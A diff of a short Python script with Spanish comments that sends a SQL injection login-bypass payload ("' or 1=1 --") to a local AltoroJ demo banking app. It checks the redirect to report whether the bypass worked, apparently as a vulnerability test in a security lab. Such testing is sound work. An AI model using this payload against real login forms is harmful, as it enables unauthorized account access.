@@ -1,23 +1,28 @@
 import requests
 
-# Define la URL de AltoroJ
-url = "http://localhost:8130/altoroj/login.jsp"
+# Definir la URL del formulario de login
+url_login = 'http://localhost:8080/AltoroJ/doLogin'
 
-# Payload para Inyeccion SQL
-payload = "' or 1=1 --"
+# Definir los datos del formulario
+data = {
+    'uid': "' or 1=1 --",
+    'passw': "any_password",
+    'btnSubmit': "Login"
+}
 
-#Solicitud POST
-data = {"username": payload, "password": "any_password"}
-response = requests.post(url, data=data)
+# Realizar la solicitud POST al formulario de login y seguir redirecciones
+with requests.Session() as session:
+    response = session.post(url_login, data=data, allow_redirects=False)
 
-#Para saber que contiene y que poner en el if
-print(response.text)
+    # Verificar la URL de destino después de la redirección
+    if response.status_code == 302:  # Verificar que sea una redirección
+        redirect_url = response.headers['Location']
 
-#Respuesta POST
-if "" in response.text:
-    #Vulnerabilidad presente
-    exitCode = 1  
-else:
-    exitCode = 0
-
-exit(exitCode)
+        if "/AltoroJ/bank/main.jsp" in redirect_url:
+            print("1")
+        elif "login.jsp" in redirect_url:
+            print("0")
+        else:
+            print("0")
+    else:
+        print("0")
